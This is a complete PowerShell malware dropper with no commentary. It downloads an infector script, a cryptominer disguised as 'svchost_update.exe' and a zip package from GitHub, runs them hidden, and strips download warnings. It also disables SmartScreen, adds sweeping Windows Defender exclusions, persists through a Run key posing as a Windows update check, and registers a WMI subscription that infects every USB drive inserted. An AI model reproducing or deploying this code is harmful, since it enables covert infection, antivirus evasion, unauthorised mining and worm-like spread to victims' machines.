Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path -Path $logPath -Parent
$infectorScriptPath = "C:\Windows\Temp\infect.ps1"
$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\svchost_update.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

if (-not (Test-Path -Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
    Add-Content -Path $logPath -Value "[$(Get-Date)] Created log directory: $logDirectory"
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Script started - Running under SYSTEM account."

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (Is-Admin) {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "[$(Get-Date)] WARNING: Script is NOT running with Administrator privileges."
}

# Consolidated download logic for all payloads
Add-Content -Path $logPath -Value "[$(Get-Date)] Starting download checks for all payloads..."

# Download infector.ps1 if it doesn't exist
if (-not (Test-Path -Path $infectorScriptPath)) {
    try {
        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 not found at $infectorScriptPath. Downloading from $infectorUrl..."
        $infectorResponse = Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 downloaded to $infectorScriptPath."
        if (-not (Test-Path -Path $infectorScriptPath)) {
            throw "Downloaded infect.ps1 not found at $infectorScriptPath."
        }
        if ([System.IO.Path]::GetExtension($infectorScriptPath).ToLower() -ne ".ps1") {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded infect.ps1 does not have .ps1 extension."
        }
        Unblock-File -Path $infectorScriptPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $infectorScriptPath"
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download infect.ps1: $($_.Exception.Message)"
    }
} else {
    Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 already exists at $infectorScriptPath. Skipping download."
}

# Download svchost_update.exe if it doesn't exist
if (-not (Test-Path -Path $payloadPath)) {
    try {
        Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe not found at $payloadPath. Downloading from $payloadUrl..."
        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] EXE payload downloaded to $payloadPath."
        if (-not (Test-Path -Path $payloadPath)) {
            throw "Downloaded file not found at $payloadPath."
        }
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded file does not have .exe extension."
        }
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download svchost_update.exe: $($_.Exception.Message)"
    }
} else {
    Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe already exists at $payloadPath. Skipping download."
}

# Download and extract WindowsServices if it doesn't exist
if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    try {
        Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder not found at $crackedSoftwareFolder. Downloading from $crackedSoftwareZipUrl..."
        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Update package downloaded to $crackedSoftwareZipPath."
        if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
            throw "Downloaded zip file not found at $crackedSoftwareZipPath."
        }
        Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Extracted update package to $crackedSoftwareFolder."
        if (-not (Test-Path -Path $crackedSoftwareExe)) {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
            throw "Update executable missing."
        }
        Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from files in $crackedSoftwareFolder."
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download or extract WindowsServices: $($_.Exception.Message)"
    }
} else {
    Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder already exists at $crackedSoftwareFolder."
    if (-not (Test-Path -Path $crackedSoftwareExe)) {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
    }
}

# Execute svchost_update.exe if it exists
if (Test-Path -Path $payloadPath) {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Existing svchost_update.exe found at $payloadPath."
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
        try {
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
            Add-Content -Path $logPath -Value "[$(Get-Date)] Existing payload executed successfully."
        } catch {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to execute payload: $($_.Exception.Message)"
        }
    } else {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Existing file at $payloadPath is not an .exe."
    }
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Attempting to disable SmartScreen..."
try {
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
    Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen disabled successfully."
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Confirmed: SmartScreen is disabled."
    } else {
        Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
    }
} catch {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to disable or check SmartScreen: $($_.Exception.Message)"
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Waiting for Windows Defender service to be fully ready..."
$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Windows Defender service is running and Real-time Protection is enabled."
            break
        }
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Defender service not yet found or ready. Error: $($_.Exception.Message)"
    }
    Start-Sleep -Seconds $delayBetweenChecks
    if ($i -eq ($maxAttempts - 1)) {
        Add-Content -Path $logPath -Value "[$(Get-Date)] WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
    }
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Attempting to add Windows Defender exclusions."
$exclusionsPaths = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\svchost_update.exe",
    "C:\Windows\Temp\WindowsServices",
    "C:\Windows\Temp\update_package.zip",
    "C:\ProgramData\WinKit",
    "C:\Windows\Temp\*",
    "C:\ProgramData\Microsoft\Windows\Temp",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Program Files\McAfee",
    "C:\Program Files\Symantec",
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files\Avast Software",
    "C:\Program Files\AVG",
    $infectorScriptPath
)
$exclusionsProcesses = @(
    "svchost_update.exe",
    "ServiceHost.exe",
    "cmd.exe",
    "powershell.exe"
)
$exclusionsExtensions = @(
    "exe",
    "dll",
    "bat",
    "cmd",
    "ps1",
    "vbs",
    "js",
    "zip"
)
foreach ($excl in $exclusionsPaths) {
    try {
        $currentExclusions = Get-MpPreference
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $pathExists) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion path added: $excl"
        } else {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion path already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to add exclusion path: $excl - Error: $($_.Exception.Message)"
    }
}
foreach ($excl in $exclusionsProcesses) {
    try {
        $currentExclusions = Get-MpPreference
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $processExists) {
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion process added: $excl"
        } else {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion process already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to add exclusion process: $excl - Error: $($_.Exception.Message)"
    }
}
foreach ($excl in $exclusionsExtensions) {
    try {
        $currentExclusions = Get-MpPreference
        $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $extensionExists) {
            Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion extension added: $excl"
        } else {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Exclusion extension already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to add exclusion extension: $excl - Error: $($_.Exception.Message)"
    }
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Checking registry key for persistence..."
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdateCheck"
    $scriptPath = $PSCommandPath
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Registry key already exists and correctly configured: $regPath\$regName"
    } else {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
            Add-Content -Path $logPath -Value "[$(Get-Date)] Created registry path: $regPath"
        }
        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Registry key set or updated: $regPath\$regName"
    }
} catch {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to check or set registry key: $($_.Exception.Message)"
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Setting up WMI event subscription for USB detection..."
try {
    $filterName = "USBInsertionFilter"
    $consumerName = "USBInfectionConsumer"

    # Check if WMI filter and consumer already exist
    $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
    $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""

    if ($existingFilter -and $existingConsumer -and $existingBinding) {
        Add-Content -Path $logPath -Value "[$(Get-Date)] WMI event subscription already exists: $filterName, $consumerName"
    } else {
        # Remove existing filter, consumer, or binding if they partially exist
        if ($existingBinding) {
            $existingBinding | Remove-WmiObject
            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed existing WMI binding."
        }
        if ($existingFilter) {
            $existingFilter | Remove-WmiObject
            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed existing WMI filter."
        }
        if ($existingConsumer) {
            $existingConsumer | Remove-WmiObject
            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed existing WMI consumer."
        }

        # Create WMI event filter
        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $query
        }
        Add-Content -Path $logPath -Value "[$(Get-Date)] Created WMI event filter: $filterName"

        # Create WMI command line consumer
        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$infectorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $commandLine
        }
        Add-Content -Path $logPath -Value "[$(Get-Date)] Created WMI command line consumer: $consumerName"

        # Bind filter to consumer
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
        Add-Content -Path $logPath -Value "[$(Get-Date)] Created WMI binding between $filterName and $consumerName"
    }
} catch {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to set up WMI event subscription: $($_.Exception.Message)"
}

Add-Content -Path $logPath -Value "[$(Get-Date)] Script execution finished."
